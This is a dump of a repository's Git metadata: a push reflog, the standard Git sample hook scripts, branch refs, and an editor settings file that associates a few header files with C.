14fe592bf1a66921c2dc53b3acdb5c35a3658b7d c0263951e2a4c7476b2ce63b51936dfeb9f3b231 justinhalford <justinhalford@gmail.com> 1715369333 -0400	update by push
c0263951e2a4c7476b2ce63b51936dfeb9f3b231 f7adf10d49e89df1e4d4682198b888399f1db660 justinhalford <justinhalford@gmail.com> 1715369357 -0400	update by push
f7adf10d49e89df1e4d4682198b888399f1db660 0202c63b32f8115588a8ded6c99c19abaa00ceec justinhalford <justinhalford@gmail.com> 1715370417 -0400	update by push
0202c63b32f8115588a8ded6c99c19abaa00ceec e6bc2a3740536d7322daca5a8bc74e4d0dddd69b justinhalford <justinhalford@gmail.com> 1715370441 -0400	update by push
e6bc2a3740536d7322daca5a8bc74e4d0dddd69b 96ed5df9314034ff6045b5cbffe184421835c35f justinhalford <justinhalford@gmail.com> 1715370455 -0400	update by push
96ed5df9314034ff6045b5cbffe184421835c35f d0659dea09fb8c1b4887aa1cd00b1a0f3ed73c95 justinhalford <justinhalford@gmail.com> 1715370464 -0400	update by push
d0659dea09fb8c1b4887aa1cd00b1a0f3ed73c95 7b3f5fc02947a2368cb2f01879ce7e638ee89558 justinhalford <justinhalford@gmail.com> 1715370966 -0400	update by push
7b3f5fc02947a2368cb2f01879ce7e638ee89558 0f69a1a4b060bf81f22a99c941caa00ab6d4bead justinhalford <justinhalford@gmail.com> 1715370979 -0400	update by push
0f69a1a4b060bf81f22a99c941caa00ab6d4bead fdcb76149a9f9006d585eeb37bc48fd1851ad929 justinhalford <justinhalford@gmail.com> 1715370993 -0400	update by push
fdcb76149a9f9006d585eeb37bc48fd1851ad929 95d1cdab560b609fc9158b1bd9023da052eaa434 justinhalford <justinhalford@gmail.com> 1715372162 -0400	update by push
95d1cdab560b609fc9158b1bd9023da052eaa434 d6eceb369ee91f7e45423036c98cc5aaec21942f justinhalford <justinhalford@gmail.com> 1715372207 -0400	update by push
d6eceb369ee91f7e45423036c98cc5aaec21942f d585a003a2eedf138cd3eb1bd94c125e435b29e3 justinhalford <justinhalford@gmail.com> 1715372219 -0400	update by push
d585a003a2eedf138cd3eb1bd94c125e435b29e3 3436788ef72ca8e48b6ffb9f6066c22dba349914 justinhalford <justinhalford@gmail.com> 1715372326 -0400	update by push
3436788ef72ca8e48b6ffb9f6066c22dba349914 7869caab242c56651c0f3bc1f9b64b1e5eaaa492 justinhalford <justinhalford@gmail.com> 1715372360 -0400	update by push
7869caab242c56651c0f3bc1f9b64b1e5eaaa492 af180089de1a3acdd6166f413f1d16e6c30c02ef justinhalford <justinhalford@gmail.com> 1715372397 -0400	update by push
af180089de1a3acdd6166f413f1d16e6c30c02ef fd7a09e9c2aa49bcd625afcc2b87c3743c7f95b6 justinhalford <justinhalford@gmail.com> 1715372406 -0400	update by push
fd7a09e9c2aa49bcd625afcc2b87c3743c7f95b6 5545c448f677eccdce7ac6b9131c182d2954f329 justinhalford <justinhalford@gmail.com> 1715372414 -0400	update by push
5545c448f677eccdce7ac6b9131c182d2954f329 64277083a026f39b3abc150fe406b6cda8862f36 justinhalford <justinhalford@gmail.com> 1715372422 -0400	update by push
64277083a026f39b3abc150fe406b6cda8862f36 fcf3cb1e8cf4dcefcafbf33c806032b620df9a28 justinhalford <justinhalford@gmail.com> 1715372428 -0400	update by push
fcf3cb1e8cf4dcefcafbf33c806032b620df9a28 4b2c5ccad541910ab2dcdfa95a9755821dd75b57 justinhalford <justinhalford@gmail.com> 1715372439 -0400	update by push
4b2c5ccad541910ab2dcdfa95a9755821dd75b57 53927cc0eeb8419ab1a3b21a91697709e0613aa2 justinhalford <justinhalford@gmail.com> 1715372454 -0400	update by push
53927cc0eeb8419ab1a3b21a91697709e0613aa2 3e01dd887f5a7e10b72aa94a5367d2028b6b12e0 justinhalford <justinhalford@gmail.com> 1715372463 -0400	update by push
3e01dd887f5a7e10b72aa94a5367d2028b6b12e0 39aedf90415245eafd3c95798090c461cc26bfa3 justinhalford <justinhalford@gmail.com> 1715372475 -0400	update by push
39aedf90415245eafd3c95798090c461cc26bfa3 94e0fad4ba54c5756377c7c6cc9e089ac2f191f2 justinhalford <justinhalford@gmail.com> 1715372486 -0400	update by push
94e0fad4ba54c5756377c7c6cc9e089ac2f191f2 3845d84d9c7540119bb74b891e14983ea8dba45a justinhalford <justinhalford@gmail.com> 1715372494 -0400	update by push
3845d84d9c7540119bb74b891e14983ea8dba45a 70ad4b922ba524873135adaf3b307dceec5fff39 justinhalford <justinhalford@gmail.com> 1715372505 -0400	update by push
70ad4b922ba524873135adaf3b307dceec5fff39 e212104358187d46d55b55a5d994a874c50290da justinhalford <justinhalford@gmail.com> 1715372540 -0400	update by push
e212104358187d46d55b55a5d994a874c50290da ff78f998051f4e2b0402d854b499d0554db314d6 justinhalford <justinhalford@gmail.com> 1715372555 -0400	update by push
ff78f998051f4e2b0402d854b499d0554db314d6 bbb9ce7d47758029541bb03e9c2f4550d43e5cd2 justinhalford <justinhalford@gmail.com> 1715372565 -0400	update by push
bbb9ce7d47758029541bb03e9c2f4550d43e5cd2 f61ec5e4fa3944f18ce7eef293e76d7a5dd69ba4 justinhalford <justinhalford@gmail.com> 1715372581 -0400	update by push
f61ec5e4fa3944f18ce7eef293e76d7a5dd69ba4 589fc7a3642f83ecd3b7845a6627a1acd2d375bd justinhalford <justinhalford@gmail.com> 1715372635 -0400	update by push
589fc7a3642f83ecd3b7845a6627a1acd2d375bd 9458ef8d05043dd7f6ac9dd048ba5ac9e7196497 justinhalford <justinhalford@gmail.com> 1715372829 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/master>
<START OF ./.git/hooks/commit-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message.
# Called by "git commit" with one argument, the name of the file
# that has the commit message.  The hook should exit with non-zero
# status after issuing an appropriate message if it wants to stop the
# commit.  The hook is allowed to edit the commit message file.
#
# To enable this hook, rename this file to "commit-msg".

# Uncomment the below to add a Signed-off-by line to the message.
# Doing this in a hook is a bad idea in general, but the prepare-commit-msg
# hook is more suited to it.
#
# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# grep -qs "^$SOB" "$1" || echo "$SOB" >> "$1"

# This example catches duplicate Signed-off-by lines.

test "" = "$(grep '^Signed-off-by: ' "$1" |
	 sort | uniq -c | sed -e '/^[ 	]*1[ 	]/d')" || {
	echo >&2 Duplicate Signed-off-by lines.
	exit 1
}

<END OF ./.git/hooks/commit-msg.sample>
<START OF ./.git/hooks/pre-rebase.sample>
#!/bin/sh
#
# Copyright (c) 2006, 2008 Junio C Hamano
#
# The "pre-rebase" hook is run just before "git rebase" starts doing
# its job, and can prevent the command from running by exiting with
# non-zero status.
#
# The hook is called with the following parameters:
#
# $1 -- the upstream the series was forked from.
# $2 -- the branch being rebased (or empty when rebasing the current branch).
#
# This sample shows how to prevent topic branches that are already
# merged to 'next' branch from getting rebased, because allowing it
# would result in rebasing already published history.

publish=next
basebranch="$1"
if test "$#" = 2
then
	topic="refs/heads/$2"
else
	topic=`git symbolic-ref HEAD` ||
	exit 0 ;# we do not interrupt rebasing detached HEAD
fi

case "$topic" in
refs/heads/??/*)
	;;
*)
	exit 0 ;# we do not interrupt others.
	;;
esac

# Now we are dealing with a topic branch being rebased
# on top of master.  Is it OK to rebase it?

# Does the topic really exist?
git show-ref -q "$topic" || {
	echo >&2 "No such branch $topic"
	exit 1
}

# Is topic fully merged to master?
not_in_master=`git rev-list --pretty=oneline ^master "$topic"`
if test -z "$not_in_master"
then
	echo >&2 "$topic is fully merged to master; better remove it."
	exit 1 ;# we could allow it, but there is no point.
fi

# Is topic ever merged to next?  If so you should not be rebasing it.
only_next_1=`git rev-list ^master "^$topic" ${publish} | sort`
only_next_2=`git rev-list ^master           ${publish} | sort`
if test "$only_next_1" = "$only_next_2"
then
	not_in_topic=`git rev-list "^$topic" master`
	if test -z "$not_in_topic"
	then
		echo >&2 "$topic is already up to date with master"
		exit 1 ;# we could allow it, but there is no point.
	else
		exit 0
	fi
else
	not_in_next=`git rev-list --pretty=oneline ^${publish} "$topic"`
	/usr/bin/perl -e '
		my $topic = $ARGV[0];
		my $msg = "* $topic has commits already merged to public branch:\n";
		my (%not_in_next) = map {
			/^([0-9a-f]+) /;
			($1 => 1);
		} split(/\n/, $ARGV[1]);
		for my $elem (map {
				/^([0-9a-f]+) (.*)$/;
				[$1 => $2];
			} split(/\n/, $ARGV[2])) {
			if (!exists $not_in_next{$elem->[0]}) {
				if ($msg) {
					print STDERR $msg;
					undef $msg;
				}
				print STDERR " $elem->[1]\n";
			}
		}
	' "$topic" "$not_in_next" "$not_in_master"
	exit 1
fi

<<\DOC_END

This sample hook safeguards topic branches that have been
published from being rewound.

The workflow assumed here is:

 * Once a topic branch forks from "master", "master" is never
   merged into it again (either directly or indirectly).

 * Once a topic branch is fully cooked and merged into "master",
   it is deleted.  If you need to build on top of it to correct
   earlier mistakes, a new topic branch is created by forking at
   the tip of the "master".  This is not strictly necessary, but
   it makes it easier to keep your history simple.

 * Whenever you need to test or publish your changes to topic
   branches, merge them into "next" branch.

The script, being an example, hardcodes the publish branch name
to be "next", but it is trivial to make it configurable via
$GIT_DIR/config mechanism.

With this workflow, you would want to know:

(1) ... if a topic branch has ever been merged to "next".  Young
    topic branches can have stupid mistakes you would rather
    clean up before publishing, and things that have not been
    merged into other branches can be easily rebased without
    affecting other people.  But once it is published, you would
    not want to rewind it.

(2) ... if a topic branch has been fully merged to "master".
    Then you can delete it.  More importantly, you should not
    build on top of it -- other people may already want to
    change things related to the topic as patches against your
    "master", so if you need further changes, it is better to
    fork the topic (perhaps with the same name) afresh from the
    tip of "master".

Let's look at this example:

		   o---o---o---o---o---o---o---o---o---o "next"
		  /       /           /           /
		 /   a---a---b A     /           /
		/   /               /           /
	       /   /   c---c---c---c B         /
	      /   /   /             \         /
	     /   /   /   b---b C     \       /
	    /   /   /   /             \     /
    ---o---o---o---o---o---o---o---o---o---o---o "master"


A, B and C are topic branches.

 * A has one fix since it was merged up to "next".

 * B has finished.  It has been fully merged up to "master" and "next",
   and is ready to be deleted.

 * C has not merged to "next" at all.

We would want to allow C to be rebased, refuse A, and encourage
B to be deleted.

To compute (1):

	git rev-list ^master ^topic next
	git rev-list ^master        next

	if these match, topic has not merged in next at all.

To compute (2):

	git rev-list master..topic

	if this is empty, it is fully merged to "master".

DOC_END

<END OF ./.git/hooks/pre-rebase.sample>
<START OF ./.git/hooks/pre-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
else
	# Initial commit: diff against an empty tree object
	against=$(git hash-object -t tree /dev/null)
fi

# If you want to allow non-ASCII filenames set this variable to true.
allownonascii=$(git config --type=bool hooks.allownonascii)

# Redirect output to stderr.
exec 1>&2

# Cross platform projects tend to avoid non-ASCII filenames; prevent
# them from being added to the repository. We exploit the fact that the
# printable range starts at the space character and ends with tilde.
if [ "$allownonascii" != "true" ] &&
	# Note that the use of brackets around a tr range is ok here, (it's
	# even required, for portability to Solaris 10's /usr/bin/tr), since
	# the square bracket bytes happen to fall in the designated range.
	test $(git diff --cached --name-only --diff-filter=A -z $against |
	  LC_ALL=C tr -d '[ -~]\0' | wc -c) != 0
then
	cat <<\EOF
Error: Attempt to add a non-ASCII file name.

This can cause problems if you want to work with people on other platforms.

To be portable it is advisable to rename the file.

If you know what you are doing you can disable this check using:

  git config hooks.allownonascii true
EOF
	exit 1
fi

# If there are whitespace errors, print the offending file names and fail.
exec git diff-index --check --cached $against --

<END OF ./.git/hooks/pre-commit.sample>
<START OF ./.git/hooks/applypatch-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message taken by
# applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.  The hook is
# allowed to edit the commit message file.
#
# To enable this hook, rename this file to "applypatch-msg".

. git-sh-setup
commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
:

<END OF ./.git/hooks/applypatch-msg.sample>
<START OF ./.git/hooks/fsmonitor-watchman.sample>
#!/usr/bin/perl

use strict;
use warnings;
use IPC::Open2;

# An example hook script to integrate Watchman
# (https://facebook.github.io/watchman/) with git to speed up detecting
# new and modified files.
#
# The hook is passed a version (currently 2) and last update token
# formatted as a string and outputs to stdout a new update token and
# all files that have been modified since the update token. Paths must
# be relative to the root of the working tree and separated by a single NUL.
#
# To enable this hook, rename this file to "query-watchman" and set
# 'git config core.fsmonitor .git/hooks/query-watchman'
#
my ($version, $last_update_token) = @ARGV;

# Uncomment for debugging
# print STDERR "$0 $version $last_update_token\n";

# Check the hook interface version
if ($version ne 2) {
	die "Unsupported query-fsmonitor hook version '$version'.\n" .
	    "Falling back to scanning...\n";
}

my $git_work_tree = get_working_dir();

my $retry = 1;

my $json_pkg;
eval {
	require JSON::XS;
	$json_pkg = "JSON::XS";
	1;
} or do {
	require JSON::PP;
	$json_pkg = "JSON::PP";
};

launch_watchman();

sub launch_watchman {
	my $o = watchman_query();
	if (is_work_tree_watched($o)) {
		output_result($o->{clock}, @{$o->{files}});
	}
}

sub output_result {
	my ($clockid, @files) = @_;

	# Uncomment for debugging watchman output
	# open (my $fh, ">", ".git/watchman-output.out");
	# binmode $fh, ":utf8";
	# print $fh "$clockid\n@files\n";
	# close $fh;

	binmode STDOUT, ":utf8";
	print $clockid;
	print "\0";
	local $, = "\0";
	print @files;
}

sub watchman_clock {
	my $response = qx/watchman clock "$git_work_tree"/;
	die "Failed to get clock id on '$git_work_tree'.\n" .
		"Falling back to scanning...\n" if $? != 0;

	return $json_pkg->new->utf8->decode($response);
}

sub watchman_query {
	my $pid = open2(\*CHLD_OUT, \*CHLD_IN, 'watchman -j --no-pretty')
	or die "open2() failed: $!\n" .
	"Falling back to scanning...\n";

	# In the query expression below we're asking for names of files that
	# changed since $last_update_token but not from the .git folder.
	#
	# To accomplish this, we're using the "since" generator to use the
	# recency index to select candidate nodes and "fields" to limit the
	# output to file names only. Then we're using the "expression" term to
	# further constrain the results.
	if (substr($last_update_token, 0, 1) eq "c") {
		$last_update_token = "\"$last_update_token\"";
	}
	my $query = <<"	END";
		["query", "$git_work_tree", {
			"since": $last_update_token,
			"fields": ["name"],
			"expression": ["not", ["dirname", ".git"]]
		}]
	END

	# Uncomment for debugging the watchman query
	# open (my $fh, ">", ".git/watchman-query.json");
	# print $fh $query;
	# close $fh;

	print CHLD_IN $query;
	close CHLD_IN;
	my $response = do {local $/; <CHLD_OUT>};

	# Uncomment for debugging the watch response
	# open ($fh, ">", ".git/watchman-response.json");
	# print $fh $response;
	# close $fh;

	die "Watchman: command returned no output.\n" .
	"Falling back to scanning...\n" if $response eq "";
	die "Watchman: command returned invalid output: $response\n" .
	"Falling back to scanning...\n" unless $response =~ /^\{/;

	return $json_pkg->new->utf8->decode($response);
}

sub is_work_tree_watched {
	my ($output) = @_;
	my $error = $output->{error};
	if ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {
		$retry--;
		my $response = qx/watchman watch "$git_work_tree"/;
		die "Failed to make watchman watch '$git_work_tree'.\n" .
		    "Falling back to scanning...\n" if $? != 0;
		$output = $json_pkg->new->utf8->decode($response);
		$error = $output->{error};
		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		# Uncomment for debugging watchman output
		# open (my $fh, ">", ".git/watchman-output.out");
		# close $fh;

		# Watchman will always return all files on the first query so
		# return the fast "everything is dirty" flag to git and do the
		# Watchman query just to get it over with now so we won't pay
		# the cost in git to look up each individual file.
		my $o = watchman_clock();
		$error = $output->{error};

		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		output_result($o->{clock}, ("/"));
		$last_update_token = $o->{clock};

		eval { launch_watchman() };
		return 0;
	}

	die "Watchman: $error.\n" .
	"Falling back to scanning...\n" if $error;

	return 1;
}

sub get_working_dir {
	my $working_dir;
	if ($^O =~ 'msys' || $^O =~ 'cygwin') {
		$working_dir = Win32::GetCwd();
		$working_dir =~ tr/\\/\//;
	} else {
		require Cwd;
		$working_dir = Cwd::cwd();
	}

	return $working_dir;
}

<END OF ./.git/hooks/fsmonitor-watchman.sample>
<START OF ./.git/hooks/pre-receive.sample>
#!/bin/sh
#
# An example hook script to make use of push options.
# The example simply echoes all push options that start with 'echoback='
# and rejects all pushes when the "reject" push option is used.
#
# To enable this hook, rename this file to "pre-receive".

if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi

<END OF ./.git/hooks/pre-receive.sample>
<START OF ./.git/hooks/prepare-commit-msg.sample>
#!/bin/sh
#
# An example hook script to prepare the commit log message.
# Called by "git commit" with the name of the file that has the
# commit message, followed by the description of the commit
# message's source.  The hook's purpose is to edit the commit
# message file.  If the hook fails with a non-zero status,
# the commit is aborted.
#
# To enable this hook, rename this file to "prepare-commit-msg".

# This hook includes three examples. The first one removes the
# "# Please enter the commit message..." help message.
#
# The second includes the output of "git diff --name-status -r"
# into the message, just before the "git status" output.  It is
# commented because it doesn't cope with --amend or with squashed
# commits.
#
# The third example adds a Signed-off-by line to the message, that can
# still be edited.  This is rarely a good idea.

COMMIT_MSG_FILE=$1
COMMIT_SOURCE=$2
SHA1=$3

/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' "$COMMIT_MSG_FILE"

# case "$COMMIT_SOURCE,$SHA1" in
#  ,|template,)
#    /usr/bin/perl -i.bak -pe '
#       print "\n" . `git diff --cached --name-status -r`
# 	 if /^#/ && $first++ == 0' "$COMMIT_MSG_FILE" ;;
#  *) ;;
# esac

# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# git interpret-trailers --in-place --trailer "$SOB" "$COMMIT_MSG_FILE"
# if test -z "$COMMIT_SOURCE"
# then
#   /usr/bin/perl -i.bak -pe 'print "\n" if !$first_line++' "$COMMIT_MSG_FILE"
# fi

<END OF ./.git/hooks/prepare-commit-msg.sample>
<START OF ./.git/hooks/post-update.sample>
#!/bin/sh
#
# An example hook script to prepare a packed repository for use over
# dumb transports.
#
# To enable this hook, rename this file to "post-update".

exec git update-server-info

<END OF ./.git/hooks/post-update.sample>
<START OF ./.git/hooks/pre-merge-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git merge" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message to
# stderr if it wants to stop the merge commit.
#
# To enable this hook, rename this file to "pre-merge-commit".

. git-sh-setup
test -x "$GIT_DIR/hooks/pre-commit" &&
        exec "$GIT_DIR/hooks/pre-commit"
:

<END OF ./.git/hooks/pre-merge-commit.sample>
<START OF ./.git/hooks/pre-applypatch.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed
# by applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-applypatch".

. git-sh-setup
precommit="$(git rev-parse --git-path hooks/pre-commit)"
test -x "$precommit" && exec "$precommit" ${1+"$@"}
:

<END OF ./.git/hooks/pre-applypatch.sample>
<START OF ./.git/hooks/pre-push.sample>
#!/bin/sh

# An example hook script to verify what is about to be pushed.  Called by "git
# push" after it has checked the remote status, but before anything has been
# pushed.  If this script exits with a non-zero status nothing will be pushed.
#
# This hook is called with the following parameters:
#
# $1 -- Name of the remote to which the push is being done
# $2 -- URL to which the push is being done
#
# If pushing without using a named remote those arguments will be equal.
#
# Information about the commits which are being pushed is supplied as lines to
# the standard input in the form:
#
#   <local ref> <local sha1> <remote ref> <remote sha1>
#
# This sample shows how to prevent push of commits where the log message starts
# with "WIP" (work in progress).

remote="$1"
url="$2"

z40=0000000000000000000000000000000000000000

while read local_ref local_sha remote_ref remote_sha
do
	if [ "$local_sha" = $z40 ]
	then
		# Handle delete
		:
	else
		if [ "$remote_sha" = $z40 ]
		then
			# New branch, examine all commits
			range="$local_sha"
		else
			# Update to existing branch, examine new commits
			range="$remote_sha..$local_sha"
		fi

		# Check for WIP commit
		commit=`git rev-list -n 1 --grep '^WIP' "$range"`
		if [ -n "$commit" ]
		then
			echo >&2 "Found WIP commit in $local_ref, not pushing"
			exit 1
		fi
	fi
done

exit 0

<END OF ./.git/hooks/pre-push.sample>
<START OF ./.git/hooks/update.sample>
#!/bin/sh
#
# An example hook script to block unannotated tags from entering.
# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
#
# To enable this hook, rename this file to "update".
#
# Config
# ------
# hooks.allowunannotated
#   This boolean sets whether unannotated tags will be allowed into the
#   repository.  By default they won't be.
# hooks.allowdeletetag
#   This boolean sets whether deleting tags will be allowed in the
#   repository.  By default they won't be.
# hooks.allowmodifytag
#   This boolean sets whether a tag may be modified after creation. By default
#   it won't be.
# hooks.allowdeletebranch
#   This boolean sets whether deleting branches will be allowed in the
#   repository.  By default they won't be.
# hooks.denycreatebranch
#   This boolean sets whether remotely creating branches will be denied
#   in the repository.  By default this is allowed.
#

# --- Command line
refname="$1"
oldrev="$2"
newrev="$3"

# --- Safety check
if [ -z "$GIT_DIR" ]; then
	echo "Don't run this script from the command line." >&2
	echo " (if you want, you could supply GIT_DIR then run" >&2
	echo "  $0 <ref> <oldrev> <newrev>)" >&2
	exit 1
fi

if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
	exit 1
fi

# --- Config
allowunannotated=$(git config --type=bool hooks.allowunannotated)
allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)
denycreatebranch=$(git config --type=bool hooks.denycreatebranch)
allowdeletetag=$(git config --type=bool hooks.allowdeletetag)
allowmodifytag=$(git config --type=bool hooks.allowmodifytag)

# check for no description
projectdesc=$(sed -e '1q' "$GIT_DIR/description")
case "$projectdesc" in
"Unnamed repository"* | "")
	echo "*** Project description file hasn't been set" >&2
	exit 1
	;;
esac

# --- Check types
# if $newrev is 0000...0000, it's a commit to delete a ref.
zero="0000000000000000000000000000000000000000"
if [ "$newrev" = "$zero" ]; then
	newrev_type=delete
else
	newrev_type=$(git cat-file -t $newrev)
fi

case "$refname","$newrev_type" in
	refs/tags/*,commit)
		# un-annotated tag
		short_refname=${refname##refs/tags/}
		if [ "$allowunannotated" != "true" ]; then
			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
			exit 1
		fi
		;;
	refs/tags/*,delete)
		# delete tag
		if [ "$allowdeletetag" != "true" ]; then
			echo "*** Deleting a tag is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/tags/*,tag)
		# annotated tag
		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
		then
			echo "*** Tag '$refname' already exists." >&2
			echo "*** Modifying a tag is not allowed in this repository." >&2
			exit 1
		fi
		;;
	refs/heads/*,commit)
		# branch
		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
			echo "*** Creating a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/heads/*,delete)
		# delete branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/remotes/*,commit)
		# tracking branch
		;;
	refs/remotes/*,delete)
		# delete tracking branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	*)
		# Anything else (is there anything else?)
		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
		exit 1
		;;
esac

# --- Finished
exit 0

<END OF ./.git/hooks/update.sample>
<START OF ./.git/refs/heads/master>
9458ef8d05043dd7f6ac9dd048ba5ac9e7196497

<END OF ./.git/refs/heads/master>
<START OF ./.git/refs/remotes/origin/master>
9458ef8d05043dd7f6ac9dd048ba5ac9e7196497

<END OF ./.git/refs/remotes/origin/master>
<START OF ./.vscode/settings.json>
{
  "files.associations": {
    "unistd.h": "c",
    "shellcode.h": "c"
  }
}
<END OF ./.vscode/settings.json>
